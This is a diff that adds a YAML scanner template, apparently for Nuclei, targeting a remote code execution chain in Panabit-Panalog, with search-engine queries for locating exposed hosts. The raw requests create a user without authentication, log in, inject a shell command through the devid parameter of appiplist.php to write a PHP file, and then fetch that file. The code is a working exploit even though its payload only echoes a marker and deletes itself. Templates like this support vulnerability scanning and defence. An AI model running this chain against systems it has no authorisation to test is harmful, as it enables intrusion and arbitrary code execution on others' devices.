@@ -1,0 +1,48 @@
+id: panabit-applist-rce
+
+info:
+  name: Panabit-Panalog applist.php RCE
+  author: zan8in
+  severity: critical
+  description: |-
+    FOFA: app="Panabit-Panalog"
+    ZoomEye: app:"Panabit-Panalog"
+  tags: panabit,rce
+
+variables:
+  randInt: '{{rand_int(111,999)}}'
+  randName: '{{randstr_1}}'
+  randBody: '{{randstr_2}}'
+
+http:
+  - raw:
+      - |
+        POST /singleuser_action.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"syncInfo": { "user": { "userId": "{{randInt}}", "userName": "{{randName}}", "employeeId": "119", "departmentId": "119", "departmentName": "119", "coporationId": "119", "corporationName": "119", "userSex": "1", "userDuty": "119", "userBirthday": "119", "userPost": "119", "userPostCode": "119", "userAlias": "119", "userRank": "119", "userPhone": "119", "userHomeAddress": "119", "userMobilePhone": "119", "userMailAddress": "119", "userMSN": "119", "userNt": "119", "userCA": "119", "userPwd": "119", "userClass": "119", "parentId": "119", "bxlx": "119" },"operationType": "ADD_USER" }}
+      
+      - |
+        GET /singlelogin.php?userId={{randInt}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /App/appiplist.php?devid=;echo%20%27%3C?php%20echo%20"{{randBody}}";unlink(__FILE__);?%3E%27%3E{{randName}}.php; HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /App/{{randName}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1==200 && contains(body_1,"{\"yn\":\"yes\",\"str\":\"OK\"}")
+          - status_code_2==302 && contains(header_2,"PHPSESSID=")
+          - status_code_3==200
+          - status_code_4==200 && contains(body_4,"{{randBody}}")
+        condition: and
